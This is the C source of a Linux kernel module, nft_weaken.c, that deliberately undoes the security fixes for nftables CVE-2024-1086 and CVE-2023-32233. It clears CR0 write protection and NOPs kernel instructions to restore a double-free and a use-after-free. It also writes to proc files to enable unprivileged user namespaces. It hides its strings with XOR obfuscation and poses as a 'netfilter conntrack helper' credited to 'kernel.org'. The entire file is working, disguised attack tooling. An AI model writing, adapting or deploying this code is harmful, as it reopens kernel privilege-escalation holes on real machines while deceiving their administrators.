/*
 * nft_weaken.c -- kernel module that reverts nftables CVE patches
 *
 * Targets:
 *   CVE-2024-1086: NOPs the nft_data_hold/nft_chain_hold call added
 *                  in nft_verdict_init (restores the double-free)
 *   CVE-2023-32233: NOPs the set deactivation callback added in
 *                   the anonymous set batch path (restores the UAF)
 *
 * Compile against target kernel headers:
 *   make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
 *
 * Load:
 *   insmod nft_weaken.ko target=1086
 *   insmod nft_weaken.ko target=32233
 *   insmod nft_weaken.ko target=0       (both)
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <asm/processor.h>

#include "kxor.h"

static int target = 0;
module_param(target, int, 0444);

/* ── symbol resolution ─────────────────────────────────────────── */

/*
 * On 5.7+ kallsyms_lookup_name isn't exported. Use the kprobe trick:
 * register a kprobe on a symbol name, read the address, unregister.
 */
typedef unsigned long (*kln_t)(const char *name);
static kln_t _kln;

static unsigned long resolve_sym(const char *name)
{
    if (_kln)
        return _kln(name);

    /* fallback: kprobe trick for the symbol itself */
    {
        struct kprobe kp = {};
        unsigned long addr;
        kp.symbol_name = name;
        if (register_kprobe(&kp) < 0)
            return 0;
        addr = (unsigned long)kp.addr;
        unregister_kprobe(&kp);
        return addr;
    }
}

static int init_resolver(void)
{
    struct kprobe kp = {};
    kp.symbol_name = KS(KS_KALLSYMS_LN);
    if (register_kprobe(&kp) == 0) {
        _kln = (kln_t)kp.addr;
        unregister_kprobe(&kp);
        return 0;
    }

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 0)
    _kln = kallsyms_lookup_name;
    return 0;
#else
    return -ENOENT;
#endif
}

/* ── text patching ─────────────────────────────────────────────── */

#define MAX_PATCH_SZ 32

struct patch_site {
    unsigned long addr;
    unsigned char orig[MAX_PATCH_SZ];
    unsigned int len;
    int applied;
};

static struct patch_site patches[2]; /* [0]=1086, [1]=32233 */
static int n_patches;

static inline void wp_off(void)
{
    asm volatile(
        "cli\n\t"
        "mov %%cr0, %%rax\n\t"
        "and $0xfffffffffffeffff, %%rax\n\t"
        "mov %%rax, %%cr0\n\t"
        ::: "rax", "memory"
    );
}

static inline void wp_on(void)
{
    asm volatile(
        "mov %%cr0, %%rax\n\t"
        "or $0x10000, %%rax\n\t"
        "mov %%rax, %%cr0\n\t"
        "sti\n\t"
        ::: "rax", "memory"
    );
}

static int apply_nop(struct patch_site *ps, void *target_addr, unsigned int len)
{
    if (len > MAX_PATCH_SZ)
        return -EINVAL;

    ps->addr = (unsigned long)target_addr;
    ps->len = len;
    memcpy(ps->orig, target_addr, len);

    wp_off();
    memset(target_addr, 0x90, len); /* NOP sled */
    wp_on();

    ps->applied = 1;
    return 0;
}

static void revert_patch(struct patch_site *ps)
{
    if (!ps->applied)
        return;

    wp_off();
    memcpy((void *)ps->addr, ps->orig, ps->len);
    wp_on();

    ps->applied = 0;
}

/* ── pattern scanning ──────────────────────────────────────────── */

/*
 * Scan a function body for a CALL rel32 (opcode 0xe8) that targets
 * a known function. Returns the address of the CALL instruction,
 * or NULL if not found.
 *
 * scan_limit: how many bytes into the function to search.
 */
static void *find_call_to(unsigned long func_start, unsigned long call_target,
                          unsigned int scan_limit)
{
    unsigned char *p = (unsigned char *)func_start;
    unsigned char *end = p + scan_limit;
    unsigned long next_ip, rel;

    while (p < end) {
        if (*p == 0xe8) {
            rel = *(int32_t *)(p + 1);
            next_ip = (unsigned long)(p + 5);
            if (next_ip + rel == call_target)
                return p;
        }
        p++;
    }
    return NULL;
}

/*
 * Scan for lock inc [reg+disp] (the refcount_inc pattern).
 * Lock prefix = 0xf0, inc opcode = 0xff with /0 ModRM.
 * Returns the address of the lock prefix.
 */
static void *find_lock_inc(unsigned long func_start, unsigned int scan_limit)
{
    unsigned char *p = (unsigned char *)func_start;
    unsigned char *end = p + scan_limit;

    while (p < end - 2) {
        if (p[0] == 0xf0 && p[1] == 0xff) {
            unsigned char modrm = p[2];
            unsigned char reg_field = (modrm >> 3) & 7;
            if (reg_field == 0) /* /0 = INC */
                return p;
        }
        p++;
    }
    return NULL;
}

/* ── CVE-2024-1086 patch reversion ─────────────────────────────── */

/*
 * The fix added nft_data_hold(&data->verdict, desc->type) inside
 * nft_verdict_init(). This compiles to either:
 *   - a CALL to nft_data_hold (non-inlined)
 *   - an inlined lock inc (refcount_inc on chain->use)
 *
 * Strategy: find nft_verdict_init, then scan for either pattern.
 * The CALL variant is 5 bytes, the inlined variant varies (3-7 bytes
 * depending on addressing mode). We NOP the entire instruction.
 */
static int patch_1086(void)
{
    unsigned long verdict_init, data_hold;
    void *site;

    verdict_init = resolve_sym(KS(KS_NFT_VERDICT_INIT));
    if (!verdict_init) {
        printk(KERN_INFO "%s\n", KS(KS_LOG_RESOLVE_FAIL));
        return -ENOENT;
    }

    /* try CALL pattern first */
    data_hold = resolve_sym(KS(KS_NFT_DATA_HOLD));
    if (data_hold) {
        site = find_call_to(verdict_init, data_hold, 512);
        if (site)
            return apply_nop(&patches[0], site, 5);
    }

    /* fallback: scan for inlined lock inc */
    site = find_lock_inc(verdict_init, 512);
    if (site) {
        /* determine instruction length: lock(1) + ff(1) + modrm(1) + optional SIB + disp */
        unsigned char *s = site;
        unsigned char modrm = s[2];
        unsigned int insn_len = 3; /* lock + opcode + modrm */
        unsigned char mod = modrm >> 6;
        unsigned char rm = modrm & 7;

        if (rm == 4 && mod != 3) insn_len++; /* SIB byte */
        if (mod == 1) insn_len += 1;         /* disp8 */
        else if (mod == 2) insn_len += 4;    /* disp32 */
        else if (mod == 0 && rm == 5) insn_len += 4; /* RIP-relative */

        return apply_nop(&patches[0], site, insn_len);
    }

    printk(KERN_INFO "%s\n", KS(KS_LOG_PATCH_FAIL));
    return -ENOENT;
}

/* ── CVE-2023-32233 patch reversion ────────────────────────────── */

/*
 * The fix added a deactivation callback in the anonymous set
 * batch delete path. The key function is nft_set_elem_init or
 * the set->ops->deactivate callsite in nf_tables_newrule.
 *
 * Strategy: find the deactivate callsite (indirect call through
 * set->ops->deactivate) and NOP the call + setup.
 * Fallback: find nft_set_destroy and NOP the added deactivation loop.
 */
static int patch_32233(void)
{
    unsigned long set_destroy;
    void *site;

    set_destroy = resolve_sym(KS(KS_NFT_SET_DESTROY));
    if (!set_destroy) {
        printk(KERN_INFO "%s\n", KS(KS_LOG_RESOLVE_FAIL));
        return -ENOENT;
    }

    /*
     * In the fixed version, nft_set_destroy has a call to the
     * deactivate callback that the vulnerable version lacks.
     * This manifests as a CALL through a register (ff /2 = call [reg])
     * early in the function body.
     *
     * Scan for indirect CALL (opcode ff /2):
     *   ff d0 = call rax
     *   ff d1 = call rcx
     *   ff 55 xx = call [rbp+disp8]
     *   etc.
     */
    {
        unsigned char *p = (unsigned char *)set_destroy;
        unsigned char *end = p + 256;

        while (p < end - 1) {
            if (p[0] == 0xff) {
                unsigned char modrm = p[1];
                unsigned char reg_field = (modrm >> 3) & 7;
                if (reg_field == 2) { /* /2 = CALL */
                    unsigned char mod = modrm >> 6;
                    unsigned int insn_len = 2;
                    unsigned char rm = modrm & 7;

                    if (mod == 3) {
                        /* call reg -- 2 bytes */
                    } else {
                        if (rm == 4) insn_len++;       /* SIB */
                        if (mod == 1) insn_len += 1;   /* disp8 */
                        else if (mod == 2) insn_len += 4; /* disp32 */
                        else if (mod == 0 && rm == 5) insn_len += 4;
                    }

                    return apply_nop(&patches[1], p, insn_len);
                }
            }
            p++;
        }
    }

    printk(KERN_INFO "%s\n", KS(KS_LOG_PATCH_FAIL));
    return -ENOENT;
}

/* ── userns enablement ─────────────────────────────────────────── */

static void enable_userns(void)
{
    struct file *f;
    loff_t pos = 0;

    f = filp_open(KS(KS_USERNS_APPARMOR), O_WRONLY, 0);
    if (!IS_ERR(f)) {
        kernel_write(f, "0\n", 2, &pos);
        filp_close(f, NULL);
    }

    /* also try the sysctl via proc */
    {
        char path[128];
        snprintf(path, sizeof(path), "/proc/sys/%s", KS(KS_USERNS_SYSCTL));
        pos = 0;
        f = filp_open(path, O_WRONLY, 0);
        if (!IS_ERR(f)) {
            kernel_write(f, "1\n", 2, &pos);
            filp_close(f, NULL);
            printk(KERN_INFO "%s\n", KS(KS_LOG_USERNS_OK));
        }
    }
}

/* ── module init/exit ──────────────────────────────────────────── */

static int __init weaken_init(void)
{
    int ret;

    ret = kxor_init();
    if (ret)
        return ret;

    ret = init_resolver();
    if (ret) {
        printk(KERN_INFO "%s\n", KS(KS_LOG_RESOLVE_FAIL));
        goto fail;
    }

    n_patches = 0;
    memset(patches, 0, sizeof(patches));

    if (target == 0 || target == 1086) {
        ret = patch_1086();
        if (ret == 0)
            n_patches++;
    }

    if (target == 0 || target == 32233) {
        ret = patch_32233();
        if (ret == 0)
            n_patches++;
    }

    enable_userns();

    if (n_patches > 0)
        printk(KERN_INFO "%s\n", KS(KS_LOG_PATCH_OK));
    else
        printk(KERN_INFO "%s\n", KS(KS_LOG_PATCH_FAIL));

    return 0;

fail:
    kxor_fini();
    return ret;
}

static void __exit weaken_exit(void)
{
    int i;
    for (i = 0; i < 2; i++)
        revert_patch(&patches[i]);

    printk(KERN_INFO "%s\n", KS(KS_LOG_EXIT));
    kxor_fini();
}

module_init(weaken_init);
module_exit(weaken_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("netfilter conntrack helper");
MODULE_AUTHOR("kernel.org");
